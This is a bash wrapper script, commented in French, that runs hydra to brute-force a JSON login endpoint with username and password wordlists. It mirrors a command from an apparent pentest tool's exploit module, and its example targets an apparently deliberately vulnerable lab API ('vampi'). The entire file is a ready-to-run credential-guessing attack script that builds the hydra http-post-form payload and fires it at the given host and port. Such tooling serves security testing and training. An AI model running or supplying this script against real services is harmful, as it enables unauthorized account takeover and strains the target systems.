#!/usr/bin/env bash
# Wrapper hydra — brute-force d'un formulaire/endpoint de login JSON.
# Miroir de la commande construite par core/exploit.py (run_hydra).
#
# Usage : ./run_hydra.sh <host> <port> <path> <user_field> <pass_field> <fail_marker> <users.txt> <pass.txt>
#   ./run_hydra.sh vampi 5000 /users/v1/login username password fail \
#       ../config/wordlists/users.txt ../config/wordlists/passwords.txt
#
# Rappel syntaxe hydra http-post-form (cf. `hydra http-post-form -U`) :
#   url:params:[optionnels]:condition   (la condition est EN DERNIER ;
#   l'en-tête H= est un optionnel AVANT la condition ; les ':' littéraux
#   du corps JSON et de l'en-tête sont échappés en '\:').
set -euo pipefail

HOST="${1:?host}"; PORT="${2:?port}"; PATH_="${3:?path}"
UF="${4:?user_field}"; PF="${5:?pass_field}"; MARK="${6:?fail_marker}"
USERS="${7:?users.txt}"; PASSWDS="${8:?pass.txt}"

command -v hydra >/dev/null 2>&1 || {
  echo "[erreur] hydra absent. Installez : sudo apt install -y hydra" >&2
  exit 127
}

BODY="{\"${UF}\"\\:\"^USER^\",\"${PF}\"\\:\"^PASS^\"}"
FORM="${PATH_}:${BODY}:H=Content-Type\\: application/json:F=${MARK}"

exec hydra -L "$USERS" -P "$PASSWDS" "$HOST" -s "$PORT" http-post-form "$FORM" -t 4 -I
